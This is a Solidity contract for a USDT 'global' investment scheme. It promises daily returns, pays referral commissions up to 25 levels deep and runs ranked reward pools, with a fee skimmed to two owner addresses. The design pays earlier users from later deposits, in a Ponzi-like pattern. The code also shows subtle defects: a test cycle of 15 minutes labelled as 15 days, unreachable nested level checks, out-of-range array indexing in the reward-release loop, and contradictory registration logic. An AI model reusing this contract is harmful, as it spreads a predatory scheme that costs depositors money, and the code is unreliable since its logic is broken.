// SPDX-License-Identifier: GPLv3

pragma solidity ^0.8.10;

import "./SafeMath.sol";
import "./IERC20.sol";

contract SSSGlobal {
    using SafeMath for uint256; 
    IERC20 public usdt;

    uint256 private constant baseDivider = 10000;
    uint256 private constant feePercents = 500; 
    uint256 private constant minDeposit = 5e6; //50e6;
    uint256 private constant maxDeposit = 2000e6;

    uint256 private constant minWithdraw = 5e6;
    uint256 private constant freezeIncomePercents = 3000;
    uint256 private constant timeStep = 1 days;
    uint256 private constant dayPerCycle = 15 minutes; //15 days; 

    uint256 private constant dayRewardPercents = 133;
    uint256 private constant maxAddFreeze = 30 days;
    uint256 private constant referDepth = 25;
    uint256 private constant directPercents = 500;

    uint256[1] private level2Percents = [100];    
    uint256[1] private level3Percents = [200];    
    uint256[2] private level4Percents = [300, 100];
    uint256[15] private level5Percents = [100, 100, 100, 100, 100, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50];
    uint256[5] private level6Percents = [25, 25, 25, 25, 25]; 
    uint256[10] private roiPercents = [100, 50, 50, 25, 14, 10, 6, 6, 6, 3];

    uint256 private constant luckPoolPercents = 30;
    uint256 private constant diamondPoolPercents = 30;
    uint256 private constant royalDiamondPoolPercents = 30;
    uint256 private constant topPoolPercents = 30;
    uint256 private constant roylPoolPercents = 100;

    uint256[7] private balDown = [10e10, 30e10, 100e10, 500e10, 1000e10, 1500e10, 2000e10];
    uint256[7] private balDownRate = [1000, 1500, 2000, 5000, 6000, 7000, 8000];  
    uint256[7] private balRecover = [15e10, 50e10, 150e10, 500e10, 1000e10, 1500e10, 2000e10];
    mapping(uint256=>bool) public balStatus; 

    address[2] public feeReceivers;

    address public defaultRefer;
    uint256 public startTime;
    uint256 public lastDistribute;
    uint256 public totalUser;
    uint256 public luckPool;
    uint256 public diamondPool;
    uint256 public royalDiamondPool;
    uint256 public topPool;
    uint256 public roylPool;

    mapping(uint256=>address[]) public dayLuckUsers;
    mapping(uint256=>uint256[]) public dayLuckUsersDeposit;
    mapping(uint256=>address[5]) public dayTopUsers;

    address[] public level2Users;
    address[] public level3Users;
    address[] public level4Users;
    address[] public level5Users;
    address[] public level6Users;
    struct OrderInfo {
        uint256 amount; 
        uint256 start;
        uint256 unfreeze; 
        bool isUnfreezed;
    }

    mapping(address => OrderInfo[]) public orderInfos;
    address[] public depositors;

    struct UserInfo {
        address referrer;
        uint256 start;
        uint256 level; 
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 maxDirectDeposit;
        uint256 teamTotalDeposit;
        uint256 totalFreezed;
        uint256 totalRevenue;
    }

    mapping(address=>UserInfo) public userInfo;
    mapping(uint256 => mapping(address => uint256)) public userLayer1DayDeposit;
    mapping(address => mapping(uint256 => address[])) public teamUsers;

    struct RewardInfo{
        uint256 capitals;
        uint256 statics;
        uint256 directs;
        uint256 diamond;
        uint256 royalDiamond;
        uint256 luck;
        uint256 top;
        uint256 royl;
        uint256 dvlptFund;
        uint256 dvlptFundDebt;
        uint256 roi;
    }

    struct LevelInfo{
        uint256 level2Freezed;
        uint256 level2Released;
        uint256 level3Freezed;
        uint256 level3Released;
        uint256 level4Freezed;
        uint256 level4Released;
        uint256 level5Freezed;
        uint256 level5Released;
        uint256 level6Left;
        uint256 level6Freezed;
        uint256 level6Released;
    }
    
    mapping (address => RewardInfo) public rewardInfo;
    mapping (address => LevelInfo) public levelInfo;
    
    bool public isFreezeReward;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositByDvlptFund(address user, uint256 amount);
    event TransferByDvlptFund(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);

    constructor(address _usdtAddr, address _defaultRefer, address[2] memory _feeReceivers) {
        usdt = IERC20(_usdtAddr);
        feeReceivers = _feeReceivers;
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = _defaultRefer;
    }

    function register(address _referral) external {
        if(userInfo[_referral].totalDeposit > 49) {
            require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer);
            UserInfo storage user = userInfo[msg.sender];
            require(user.referrer == address(0), "referrer bonded");
            user.referrer = _referral;
            user.start = block.timestamp;
            _updateTeamNum(msg.sender);
            totalUser = totalUser.add(1);
            emit Register(msg.sender, _referral);
        } else {
            require(userInfo[_referral].totalDeposit < 50 || _referral == defaultRefer);
            UserInfo storage user = userInfo[msg.sender];
            require(user.referrer == address(0), "referrer bonded");
            user.referrer = _referral;
            user.start = block.timestamp;
            _updateTeamNum(msg.sender);
            totalUser = totalUser.add(1);
            emit Register(msg.sender, _referral);
        }
    }

    function deposit(uint256 _amount) external { 
        usdt.transferFrom(msg.sender, address(this), _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }
    
    function depositByDvlptFund(uint256 _amount) external {
        require(_amount >= minWithdraw && _amount.mod(minDeposit) == 0, "amount err");
        require(userInfo[msg.sender].totalDeposit == 0, "activated");
        uint256 dvlptFundLeft = getCurDvlptFund(msg.sender);
        require(dvlptFundLeft >= _amount, "Insufficient Development Fund");
        rewardInfo[msg.sender].dvlptFundDebt = rewardInfo[msg.sender].dvlptFundDebt.add(_amount);
        _deposit(msg.sender, _amount);
        emit DepositByDvlptFund(msg.sender, _amount);
    }

    function transferByDvlptFund(address _receiver, uint256 _amount) external {
        require(_amount >= minWithdraw && _amount.mod(minWithdraw) == 0, "amount error");
        uint256 dvlptFundLeft = getCurDvlptFund(msg.sender);
        require(dvlptFundLeft >= _amount, "Insufficient Development Fund");
        rewardInfo[msg.sender].dvlptFundDebt = rewardInfo[msg.sender].dvlptFundDebt.add(_amount);
        rewardInfo[_receiver].dvlptFund = rewardInfo[_receiver].dvlptFund.add(_amount);
        emit TransferByDvlptFund(msg.sender, _receiver, _amount);
    }

    function distributePoolRewards() public {
        if(block.timestamp > lastDistribute.add(timeStep)){
            uint256 dayNow = getCurDay();
            _distributeDiamondPool();
            _distributeRoylPool();
            _distributeRoyalDiamondPool();
            _distributeLuckPool(dayNow);
            _distributeTopPool(dayNow);
            lastDistribute = block.timestamp;
        }
    }

    function withdraw() external {
        distributePoolRewards();
        (uint256 staticReward, uint256 staticDvlptFund) = _calCurStaticRewards(msg.sender);
        uint256 dvlptFundAmt = staticDvlptFund;
        uint256 withdrawable = staticReward;

        (uint256 dynamicReward, uint256 dynamicDvlptFund) = _calCurDynamicRewards(msg.sender);
        withdrawable = withdrawable.add(dynamicReward);
        dvlptFundAmt = dvlptFundAmt.add(dynamicDvlptFund);

        RewardInfo storage userRewards = rewardInfo[msg.sender];
        LevelInfo storage levelRewards = levelInfo[msg.sender];
        userRewards.dvlptFund = userRewards.dvlptFund.add(dvlptFundAmt);

        userRewards.statics = 0;
        userRewards.directs = 0;
        levelRewards.level2Released = 0;
        levelRewards.level3Released = 0;
        levelRewards.level4Released = 0;
        levelRewards.level5Released = 0;
        levelRewards.level6Released = 0;
        userRewards.luck = 0;
        userRewards.diamond = 0;
        userRewards.royalDiamond = 0;
        userRewards.top = 0;
        userRewards.royl = 0;
        
        withdrawable = withdrawable.add(userRewards.capitals);
        userRewards.capitals = 0;
        
        usdt.transfer(msg.sender, withdrawable);
        uint256 bal = usdt.balanceOf(address(this));
        _setFreezeReward(bal);

        emit Withdraw(msg.sender, withdrawable);
    }

    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function getDayLuckLength(uint256 _day) external view returns(uint256) {
        return dayLuckUsers[_day].length;
    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }

    function getMaxFreezing(address _user) public view returns(uint256) {
        uint256 maxFreezing;
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }

    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam){
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }

    function getCurDvlptFund(address _user) public view returns(uint256){
        (, uint256 staticDvlptFund) = _calCurStaticRewards(_user);
        (, uint256 dynamicDvlptFund) = _calCurDynamicRewards(_user);
        return rewardInfo[_user].dvlptFund.add(staticDvlptFund).add(dynamicDvlptFund).sub(rewardInfo[_user].dvlptFundDebt);
    }

    function _calCurStaticRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.statics;
        uint256 dvlptFundAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(dvlptFundAmt);
        return(withdrawable, dvlptFundAmt);
    }

    function _calCurDynamicRewards(address _user) private view returns(uint256, uint256) {
        LevelInfo storage levelRewards = levelInfo[_user];
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.directs.add(levelRewards.level2Released).add(levelRewards.level3Released).add(levelRewards.level4Released).add(levelRewards.level5Released);
        totalRewards = totalRewards.add(userRewards.luck.add(userRewards.diamond).add(userRewards.royalDiamond).add(userRewards.royl).add(userRewards.top));
        totalRewards= totalRewards.add(userRewards.roi);  
        uint256 dvlptFundAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(dvlptFundAmt);
        return(withdrawable, dvlptFundAmt);
    }

    function _updateTeamNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                    if(upline == defaultRefer) break;
                        upline = userInfo[upline].referrer;
                    }else{
                break;
            }
        }
    }

    function _updateTopUser(address _user, uint256 _amount, uint256 _dayNow) private {
        userLayer1DayDeposit[_dayNow][_user] = userLayer1DayDeposit[_dayNow][_user].add(_amount);
        bool updated;
        for(uint256 i = 0; i < 5; i++){
            address topUser = dayTopUsers[_dayNow][i];
            if(topUser == _user){
                _reOrderTop(_dayNow);
                updated = true;
                break;
            }
        }
        if(!updated){
            address lastUser = dayTopUsers[_dayNow][2];
            if(userLayer1DayDeposit[_dayNow][lastUser] < userLayer1DayDeposit[_dayNow][_user]){
                dayTopUsers[_dayNow][2] = _user;
                _reOrderTop(_dayNow);
            }
        }
    }

    function _reOrderTop(uint256 _dayNow) private {
        for(uint256 i = 5; i > 1; i--){
            address topUser1 = dayTopUsers[_dayNow][i - 1];
            address topUser2 = dayTopUsers[_dayNow][i - 2];
            uint256 amount1 = userLayer1DayDeposit[_dayNow][topUser1];
            uint256 amount2 = userLayer1DayDeposit[_dayNow][topUser2];
            if(amount1 > amount2){
                dayTopUsers[_dayNow][i - 1] = topUser2;
                dayTopUsers[_dayNow][i - 2] = topUser1;
            }
        }
    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(userInfo[upline].teamTotalDeposit > _amount){
                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
                }else{
                    userInfo[upline].teamTotalDeposit = 0;
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateReferInfo(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateLevel(address _user) private {
        UserInfo storage user = userInfo[_user];
        uint256 levelNow = _calLevelNow(_user);
        if(levelNow > user.level){
            user.level = levelNow;
            if(levelNow == 6){
                level6Users.push(_user);
                if(levelNow == 5){
                    level5Users.push(_user);
                    if(levelNow == 4){
                        level4Users.push(_user);
                        if(levelNow == 3){
                            level3Users.push(_user);
                            if(levelNow == 2){
                                level2Users.push(_user);
                            }
                        }
                    }
                }
            }
        }
    }

    function _calLevelNow(address _user) private view returns(uint256) {
        UserInfo storage user = userInfo[_user];
        uint256 total = user.totalDeposit;
        uint256 levelNow;
        if(total >= 1000e6){
            (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);
            if(total >= 2000e6 && user.teamNum >= 300 && maxTeam >= 75000e6 && otherTeam >= 75000e6){
                levelNow = 6;
                    }else if(total >= 2000e6 && user.teamNum >= 200 && maxTeam >= 50000e6 && otherTeam >= 50000e6){
                        levelNow = 5;            
                    }else if(total >= 1000e6 && user.teamNum >= 100 && maxTeam >= 20000e6 && otherTeam >= 20000e6){
                        levelNow = 4;
                    }else if(total >= 800e6 && user.teamNum >= 50 && maxTeam >= 10000e6 && otherTeam >= 10000e6){
                        levelNow = 3;
                    }else if(total >= 400e6 && user.teamNum >= 25 && maxTeam >= 5000e6 && otherTeam >= 5000e6){
                        levelNow = 2;
                    }else if(total >= 50e6){
                        levelNow = 1;
            }
        }
        return levelNow;
    }

    function _deposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        require(user.referrer != address(0), "register first");
        require(_amount >= minDeposit, "less than min");
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");
        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");

        if(user.maxDeposit == 0){
            user.maxDeposit = _amount;
            }else if(user.maxDeposit < _amount){
                user.maxDeposit = _amount;
            }
        _distributeDeposit(_amount);

        if(user.totalDeposit == 0){
            uint256 dayNow = getCurDay();
            dayLuckUsers[dayNow].push(_user);
            dayLuckUsersDeposit[dayNow].push(_amount);
            _updateTopUser(user.referrer, _amount, dayNow);
        }

        depositors.push(_user);
        user.totalDeposit = user.totalDeposit.add(_amount);
        user.totalFreezed = user.totalFreezed.add(_amount);

        _updateLevel(msg.sender);

        uint256 addFreeze = (orderInfos[_user].length.div(2)).mul(timeStep);
        if(addFreeze > maxAddFreeze){
            addFreeze = maxAddFreeze;
        }
        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        orderInfos[_user].push(OrderInfo(
            _amount, 
            block.timestamp, 
            unfreezeTime,
            false
        ));

        _unfreezeFundAndUpdateReward(msg.sender, _amount);
        distributePoolRewards();
        _updateReferInfo(msg.sender, _amount);
        _updateReward(msg.sender, _amount);
        _releaseUpRewards(msg.sender, _amount);

        uint256 bal = usdt.balanceOf(address(this));
        _balActivated(bal);
        if(isFreezeReward){
            _setFreezeReward(bal);
        }
    }

    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezeCapital;
        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount){
                order.isUnfreezed = true;
                isUnfreezeCapital = true;
                
                if(user.totalFreezed > order.amount){
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                }else{
                    user.totalFreezed = 0;
                }
                
                _removeInvalidDeposit(_user, order.amount);

                uint256 staticReward = order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider);
                if(isFreezeReward){
                    if(user.totalFreezed > user.totalRevenue){
                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);
                        if(staticReward > leftCapital){
                            staticReward = leftCapital;
                        }
                    }else{
                        staticReward = 0;
                    }
                }
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);

                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);
                
                user.totalRevenue = user.totalRevenue.add(staticReward);

                break;
            }
        }

        if(!isUnfreezeCapital){ 
            LevelInfo storage levelReward = levelInfo[_user];
            if(levelReward.level5Freezed > 0){
                uint256 release = _amount;
                if(_amount >= levelReward.level5Freezed){
                    release = levelReward.level5Freezed;
                }
                levelReward.level5Freezed = levelReward.level5Freezed.sub(release);
                levelReward.level5Released = levelReward.level5Released.add(release);
                user.totalRevenue = user.totalRevenue.add(release);
            }
        }
    }
    function _distributeRoylPool() private {
        uint256 level6Count;
        for(uint256 i = 0; i < level6Users.length; i++){
            if(userInfo[level6Users[i]].level == 6){
                level6Count = level6Count.add(1);
            }
        }
        if(level6Count > 0){
            uint256 reward = roylPool.div(level6Count);
            uint256 totalReward;
            for(uint256 i = 0; i < level6Users.length; i++){
                if(userInfo[level6Users[i]].level == 6){
                    rewardInfo[level6Users[i]].royl = rewardInfo[level6Users[i]].royl.add(reward);
                    userInfo[level6Users[i]].totalRevenue = userInfo[level6Users[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(roylPool > totalReward){
                roylPool = roylPool.sub(totalReward);
            }else{
                roylPool = 0;
            }
        }
    }

    function _distributeRoyalDiamondPool() private {
        uint256 level5Count;
        for(uint256 i = 0; i < level5Users.length; i++){
            if(userInfo[level5Users[i]].level == 5){
                level5Count = level5Count.add(1);
            }
        }
        if(level5Count > 0){
            uint256 reward = royalDiamondPool.div(level5Count);
            uint256 totalReward;
            for(uint256 i = 0; i < level5Users.length; i++){
                if(userInfo[level5Users[i]].level == 5){
                    rewardInfo[level5Users[i]].royalDiamond = rewardInfo[level5Users[i]].royalDiamond.add(reward);
                    userInfo[level5Users[i]].totalRevenue = userInfo[level5Users[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(royalDiamondPool > totalReward){
                royalDiamondPool = royalDiamondPool.sub(totalReward);
            }else{
                royalDiamondPool = 0;
            }
        }
    }

    function _distributeDiamondPool() private {
        uint256 level4Count;
        for(uint256 i = 0; i < level4Users.length; i++){
            if(userInfo[level4Users[i]].level == 4){
                level4Count = level4Count.add(1);
            }
        }
        if(level4Count > 0){
            uint256 reward = diamondPool.div(level4Count);
            uint256 totalReward;
            for(uint256 i = 0; i < level4Users.length; i++){
                if(userInfo[level4Users[i]].level == 4){
                    rewardInfo[level4Users[i]].diamond = rewardInfo[level4Users[i]].diamond.add(reward);
                    userInfo[level4Users[i]].totalRevenue = userInfo[level4Users[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(diamondPool > totalReward){
                diamondPool = diamondPool.sub(totalReward);
            }else{
                diamondPool = 0;
            }
        }
    }

    function _distributeLuckPool(uint256 _dayNow) private {
        uint256 dayDepositCount = dayLuckUsers[_dayNow - 1].length;
        if(dayDepositCount > 0){
            uint256 checkCount = 10;
            if(dayDepositCount < 10){
                checkCount = dayDepositCount;
            }
            uint256 totalDeposit;
            uint256 totalReward;
            for(uint256 i = dayDepositCount; i > dayDepositCount.sub(checkCount); i--){
                totalDeposit = totalDeposit.add(dayLuckUsersDeposit[_dayNow - 1][i - 1]);
            }

            for(uint256 i = dayDepositCount; i > dayDepositCount.sub(checkCount); i--){
                address userAddr = dayLuckUsers[_dayNow - 1][i - 1];
                if(userAddr != address(0)){
                    uint256 reward = luckPool.mul(dayLuckUsersDeposit[_dayNow - 1][i - 1]).div(totalDeposit);
                    totalReward = totalReward.add(reward);
                    rewardInfo[userAddr].luck = rewardInfo[userAddr].luck.add(reward);
                    userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);
                }
            }
            if(luckPool > totalReward){
                luckPool = luckPool.sub(totalReward);
            }else{
                luckPool = 0;
            }
        }
    }

    function _distributeTopPool(uint256 _dayNow) private {
        uint16[5] memory rates = [5000, 3000, 2000, 1000, 500];
        uint32[5] memory maxReward = [2000e6, 1000e6, 500e6, 250e6, 125e6];
        uint256 totalReward;
        for(uint256 i = 0; i < 5; i++){
            address userAddr = dayTopUsers[_dayNow - 1][i];
            if(userAddr != address(0)){
                uint256 reward = topPool.mul(rates[i]).div(baseDivider);
                if(reward > maxReward[i]){
                    reward = maxReward[i];
                }
                rewardInfo[userAddr].top = rewardInfo[userAddr].top.add(reward);
                userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);
                totalReward = totalReward.add(reward);
            }
        }
        if(topPool > totalReward){
            topPool = topPool.sub(totalReward);
        }else{
            topPool = 0;
        }
    }

    function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        usdt.transfer(feeReceivers[0], fee.div(5).mul(2));
        usdt.transfer(feeReceivers[1], fee.div(5).mul(3));
        uint256 luck = _amount.mul(luckPoolPercents).div(baseDivider);
        luckPool = luckPool.add(luck); 
        uint256 diamond = _amount.mul(diamondPoolPercents).div(baseDivider);
        diamondPool = diamondPool.add(diamond); 
        uint256 royalDiamond = _amount.mul(royalDiamondPoolPercents).div(baseDivider);
        royalDiamondPool = royalDiamondPool.add(royalDiamond);
        uint256 top = _amount.mul(topPoolPercents).div(baseDivider);
        topPool = topPool.add(top); 
        uint256 royl = _amount.mul(roylPoolPercents).div(baseDivider);
        roylPool = roylPool.add(royl); 
    }

	function _updateReward(address _user, uint256 _amount) private {
      	UserInfo storage user = userInfo[_user];
        	address upline = user.referrer;
        	for(uint256 i = 0; i < referDepth; i++){
            	if(upline != address(0)){
                	uint256 newAmount = _amount;
                	if(upline != defaultRefer){
                    	uint256 maxFreezing = getMaxFreezing(upline);
                    	if(maxFreezing < _amount){
                        	newAmount = maxFreezing;
                    	}
                	}
                	RewardInfo storage rupRewards = rewardInfo[upline];
                	LevelInfo storage upRewards = levelInfo[upline];
                	uint256 reward;
			        if(i > 5){
                  	    if(userInfo[upline].level > 5){
                        	reward = newAmount.mul(level6Percents[i - 6]).div(baseDivider);
                        	upRewards.level6Freezed = upRewards.level6Freezed.add(reward);
                    	}
                	}else if(i > 4){
                		if(userInfo[upline].level > 4){
                        	reward = newAmount.mul(level5Percents[i - 5]).div(baseDivider);
                        	upRewards.level5Freezed = upRewards.level5Freezed.add(reward);
                    	}
                	}else if(i > 3){
				        if( userInfo[upline].level > 3){
                        	reward = newAmount.mul(level4Percents[i - 4]).div(baseDivider);
                        	upRewards.level4Freezed = upRewards.level4Freezed.add(reward);
                    	}
                	}else if(i > 2){
	                    if( userInfo[upline].level > 2){
                        	reward = newAmount.mul(level3Percents[i - 3]).div(baseDivider);
                        	upRewards.level3Freezed = upRewards.level3Freezed.add(reward);
                    	}
                	}else if(i > 1){
	                  if( userInfo[upline].level > 1){
                        	reward = newAmount.mul(level2Percents[i - 2]).div(baseDivider);
                        	upRewards.level2Freezed = upRewards.level2Freezed.add(reward);
                    	}
                	}else{
                    	reward = newAmount.mul(directPercents).div(baseDivider);
                    	rupRewards.directs = rupRewards.directs.add(reward);
                    	userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                	}
                	if(upline == defaultRefer) break;
                	upline = userInfo[upline].referrer;
		                    }else{
                	break;
            	}
            }
        }

	function _releaseUpRewards(address _user, uint256 _amount) private {
		UserInfo storage user = userInfo[_user];
        	address upline = user.referrer;
            uint256 roiLevel = roiPercents[0];
            if (upline!=address(0)){
                uint256 roirew = _amount.mul(roiLevel).div(baseDivider);
                rewardInfo[upline].roi = rewardInfo[upline].roi.add(roirew);
            }
          	for(uint256 i = 0; i < referDepth; i++){
            	if(upline != address(0)){
                		uint256 newAmount = _amount;
                		if(upline != defaultRefer){
                    		uint256 maxFreezing = getMaxFreezing(upline);
                    		if(maxFreezing < _amount){
                        		newAmount = maxFreezing;
                    		}
                		}

                       	LevelInfo storage upRewards = levelInfo[upline];

                		if(i > 0 && i < 6 && userInfo[upline].level > 1){
                    		if(upRewards.level2Freezed > 0){
                        		uint256 level2Reward = newAmount.mul(level2Percents[i - 1]).div(baseDivider);
                        		if(level2Reward > upRewards.level2Freezed){
                            			level2Reward = upRewards.level2Freezed;
                        		}
                        		upRewards.level2Freezed = upRewards.level2Freezed.sub(level2Reward); 
                        		upRewards.level2Released = upRewards.level2Released.add(level2Reward);
                        		userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(level2Reward);
                    		}
                		}
                		if(i > 0 && i < 6 && userInfo[upline].level > 2){
                    		if(upRewards.level3Freezed > 0){
                        		uint256 level3Reward = newAmount.mul(level3Percents[i - 1]).div(baseDivider);
                        		if(level3Reward > upRewards.level3Freezed){
                            			level3Reward = upRewards.level3Freezed;
                        		}
                        		upRewards.level3Freezed = upRewards.level3Freezed.sub(level3Reward); 
                        		upRewards.level3Released = upRewards.level3Released.add(level3Reward);
                        		userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(level3Reward);
                    		}
                		}
                		if(i > 0 && i < 6 && userInfo[upline].level > 3){
                    		if(upRewards.level4Freezed > 0){
                        		uint256 level4Reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);
                        		if(level4Reward > upRewards.level4Freezed){
                            			level4Reward = upRewards.level4Freezed;
                        		}
                        		upRewards.level4Freezed = upRewards.level4Freezed.sub(level4Reward); 
                        		upRewards.level4Released = upRewards.level4Released.add(level4Reward);
                        		userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(level4Reward);
                    		}
                		}
                		if(i > 0 && i < 6 && userInfo[upline].level > 4){
                    		if(upRewards.level5Freezed > 0){
                        		uint256 level5Reward = newAmount.mul(level5Percents[i - 1]).div(baseDivider);
                        		if(level5Reward > upRewards.level5Freezed){
                            			level5Reward = upRewards.level5Freezed;
                        		}
                        		upRewards.level5Freezed = upRewards.level5Freezed.sub(level5Reward); 
                        		upRewards.level5Released = upRewards.level5Released.add(level5Reward);
                        		userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(level5Reward);
                    		}
                		}
                		if(i >= 6 && userInfo[upline].level > 5){
                    		if(upRewards.level6Left > 0){
                        		uint256 level6Reward = newAmount.mul(level6Percents[i - 6]).div(baseDivider);
                        		if(level6Reward > upRewards.level6Left){
                            			level6Reward = upRewards.level6Left;
                        		}
                        		upRewards.level6Left = upRewards.level6Left.sub(level6Reward); 
                        		upRewards.level6Freezed = upRewards.level6Freezed.add(level6Reward);
                    		}
                		}
                		upline = userInfo[upline].referrer;
            	}else{
                		break;
            	}
        	}
    	}

    function getRoi(address _user) external view returns(uint256) {
        return rewardInfo[_user].roi;
    }
   
    function _balActivated(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(_bal >= balDown[i - 1]){
                balStatus[balDown[i - 1]] = true;
                break;
            }
        }
    }

    function _setFreezeReward(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(balStatus[balDown[i - 1]]){
                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);
                if(_bal < balDown[i - 1].sub(maxDown)){
                    isFreezeReward = true;
                }else if(isFreezeReward && _bal >= balRecover[i - 1]){
                    isFreezeReward = false;
                }
                break;
            }
        }
    }
}